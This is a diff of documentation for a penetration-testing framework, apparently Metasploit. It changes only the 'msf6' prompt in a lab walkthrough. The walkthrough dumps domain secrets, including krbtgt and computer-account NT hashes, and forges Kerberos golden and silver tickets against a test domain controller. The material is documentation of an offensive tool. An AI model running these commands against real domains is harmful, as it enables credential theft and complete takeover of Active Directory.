@@ -63,8 +63,8 @@ For golden ticket attacks, the following information is required:
 One way of extracting the krbtgt account NTHASH is to run the `auxiliary/gather/windows_secrets_dump` module:
 
 ```msf
-msf6 > use auxiliary/gather/windows_secrets_dump
-msf6 auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
+msf > use auxiliary/gather/windows_secrets_dump
+msf auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
 [*] Running module against 192.168.123.13
 
 [*] 192.168.123.13:445 - Service RemoteRegistry is already running
@@ -102,7 +102,7 @@ ADF3\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:767400b2c71afa35a5dca216f2389cd
 With the above information a golden ticket can be forged:
 
 ```msf
-msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=767400b2c71afa35a5dca216f2389cd9 user=Administrator
+msf auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_GOLDEN domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=767400b2c71afa35a5dca216f2389cd9 user=Administrator
 
 [+] MIT Credential Cache ticket saved on /Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
 [*] Auxiliary module execution completed
@@ -149,8 +149,8 @@ Example Service Principal Names:
 One way of extracting the computer account NTHASH is to run the `auxiliary/gather/windows_secrets_dump` module:
 
 ```msf
-msf6 > use auxiliary/gather/windows_secrets_dump
-msf6 auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
+msf > use auxiliary/gather/windows_secrets_dump
+msf auxiliary(gather/windows_secrets_dump) > run smb://adf3.local;Administrator:p4$$w0rd@dc3.adf3.local
 [*] Running module against 192.168.123.13
 
 [*] 192.168.123.13:445 - Service RemoteRegistry is already running
@@ -188,7 +188,7 @@ ADF3\DC3$:1001:aad3b435b51404eeaad3b435b51404ee:fbd103200439e14d4c8adad675d5f244
 With the above information a silver ticket for SMB can be forged for the target host:
 
 ```msf
-msf6 auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_SILVER domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=fbd103200439e14d4c8adad675d5f244 user=Administrator spn=cifs/dc3.adf3.local
+msf auxiliary(admin/kerberos/forge_ticket) > run action=FORGE_SILVER domain=adf3.local domain_sid=S-1-5-21-1266190811-2419310613-1856291569 nthash=fbd103200439e14d4c8adad675d5f244 user=Administrator spn=cifs/dc3.adf3.local
 
 [+] MIT Credential Cache ticket saved on /Users/user/.msf4/loot/20220831223726_default_192.168.123.13_kerberos_ticket._550522.bin
 [*] Auxiliary module execution completed
